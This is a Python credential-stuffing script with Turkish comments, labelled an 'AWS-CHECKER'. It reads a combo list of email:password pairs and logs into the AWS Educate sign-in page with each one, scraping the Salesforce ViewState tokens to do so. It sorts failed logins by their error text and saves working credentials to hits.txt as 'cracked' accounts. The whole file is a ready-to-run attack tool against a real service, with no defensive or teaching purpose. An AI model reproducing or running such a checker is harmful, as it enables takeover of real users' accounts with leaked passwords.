## AflexTR tarafından yapılmıştır
## Email = eyup.elitass@gmail.com

## kullanacağımız modüller
import requests
import os
from bs4 import BeautifulSoup

## Combo dosyası girişi
giris = input(str("Dosya ismi:"))
a = open(giris,"r",encoding="utf-8").readlines()
file = [s.rstrip() for s in a]

def aws(): ## Fonksiyonumuz
    
    sayac = 0

    for lines in file: ## döngüye alıyoruz.
        combo = lines.split(":") ##  Email ve Password ayırma kısmı. 0=Email, 1=Password
        sayac = 0+sayac
        
        ## Site için Gerekli olan bilgileri, değişmeyen bilgileri aldığımız kısım.
        user_data = {
            'AJAXREQUEST': '_viewRoot',
            'loginPage:siteLogin:loginComponent:loginForm': 'loginPage:siteLogin:loginComponent:loginForm',
            'loginPage:siteLogin:loginComponent:loginForm:username': ''+combo[0], ## Email=0
            'loginPage:siteLogin:loginComponent:loginForm:password': ''+combo[1], ## Password=1
            'com.salesforce.visualforce.ViewStateVersion': '202009031813360944',
            'loginPage:siteLogin:loginComponent:loginForm:j_id10': 'loginPage:siteLogin:loginComponent:loginForm:j_id10',        
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'
        }

        with requests.session() as req: ## request modulünü session(oturum) olarak ve kısaltma olarak "req" olarak çağırdık.
            ## Sitemizin bilgilerini çekiyoruz
            url = "https://www.awseducate.com/signin/SiteLogin"
            r = req.get(url)
            Soup = BeautifulSoup(r.content,"html5lib")
            
            ## Burda Site içindeki Değişken verileri "user_data" bölümüne ekliyoruz, otomatik.
            user_data["com.salesforce.visualforce.ViewState"] = Soup.find(id="com.salesforce.visualforce.ViewState")["value"]
            user_data["com.salesforce.visualforce.ViewStateMAC"] = Soup.find(id="com.salesforce.visualforce.ViewStateMAC")["value"]

            giris_yap = req.post(url,data=user_data,headers=headers) ## yaptığımız işlemleri siteye gönderiyoruz.

            ## Kontrol mekanizması olduğu kısım "şifre yanlış"  gibi durumları yapacağı kısım
            if "Your login attempt has failed. Make sure the username and password are correct." in giris_yap.text:
                sayac = sayac+1
                print(str(sayac)+ " Calismayan hesap - ",combo[0],combo[1]+"  ####### MADE IN AFLEXTR(AWS-CHECKER)")
            elif "Enter a value in the Password field." in giris_yap.text:        
                sayac = sayac+1
                print(str(sayac)+ " Calismayan hesap - ",combo[0],combo[1]+"  ####### MADE IN AFLEXTR(AWS-CHECKER)")
            elif "User is not active. If password has not been set, click Forgot password link below to set." in giris_yap.text:        
                sayac = sayac+1
                print(str(sayac)+ " Calismayan hesap - ",combo[0],combo[1]+"  ####### MADE IN AFLEXTR(AWS-CHECKER)")
            else:
                sayac = sayac+1
                ## Kırdığımız hesabı dosyaya kaydediyoruz
                hit = open("hits.txt","a")
                print(str(sayac)+ " Calisan hesap + ",combo[0],combo[1])
                hit.write(combo[0])
                hit.write(":")
                hit.write(combo[1])
                hit.write("\n")
                hit.close()
aws()  ## aws fonksiyonumuzu başlatır

print("islem bitmistir.")
